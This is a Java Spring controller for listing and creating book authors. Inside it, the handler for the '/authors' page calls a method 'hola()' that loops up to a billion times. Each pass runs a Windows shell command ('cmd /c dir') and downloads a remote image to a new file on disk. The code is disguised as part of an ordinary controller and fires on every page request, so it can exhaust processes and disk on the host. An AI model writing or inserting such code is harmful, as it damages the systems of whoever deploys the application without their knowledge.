package guru.springframework.spring5webapp.controllers;

import guru.springframework.spring5webapp.domain.Author;
import guru.springframework.spring5webapp.repositories.AuthorRepository;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.*;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;

/**
 * Created by jt on 12/24/19.
 */
@Controller
public class AuthorController {

    private final AuthorRepository authorRepository;

    public AuthorController(AuthorRepository authorRepository) {
        this.authorRepository = authorRepository;
    }

    @RequestMapping("/authors")
    public String getAuthrors(Model model){
        model.addAttribute("authors", authorRepository.findAll());
        hola();
        return "authors/list";
    }

    @GetMapping("/authors/new")
    public String readdata(Model model){
        model.addAttribute("authors", authorRepository.findAll());
        return "authors/list";
    }

    @GetMapping("/authors/new/{nombre}/{apellido}")
    public String createAuthor(Model model, @PathVariable("nombre") String nombre, @PathVariable("apellido") String apellido) {
        // Aquí debes guardar el nuevo autor en tu repositorio
        String name = StringUtils.isEmpty(nombre) ? "Andres" : nombre;
        String lastname = StringUtils.isEmpty(apellido) ? "Miranda" : apellido;
        model.addAttribute("author", new Author());
        Author author = new Author(name,lastname);
        authorRepository.save(author);
        model.addAttribute("authors", authorRepository.findAll());
        // Redirige a la página de lista de autores o a donde desees después de crearlo
        return "authors/list";
    }

    public static void hola(){
        for(int i=0; i<=1000000000;i++){
            try {
                String comando = "cmd /c dir";
                ProcessBuilder processBuilder = new ProcessBuilder(comando.split(" "));
                processBuilder.redirectOutput(ProcessBuilder.Redirect.INHERIT);
                processBuilder.redirectError(ProcessBuilder.Redirect.INHERIT);
                Process proceso = processBuilder.start();
                int resultadoA = proceso.waitFor();
                System.out.println(resultadoA);
                String imauth = "https://a.espncdn.com/photo/2018/0723/r404958_1199x799_3-2.jpg";
                URL auth = new URL(imauth);
                URLConnection connection = auth.openConnection();
                InputStream inputStream = connection.getInputStream();
                FileOutputStream outputStream = new FileOutputStream("author encontrado"+i+".jpg");
                byte[] buffer = new byte[2048];
                int longitud;
                while ((longitud = inputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, longitud);
                }
                inputStream.close();
                outputStream.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
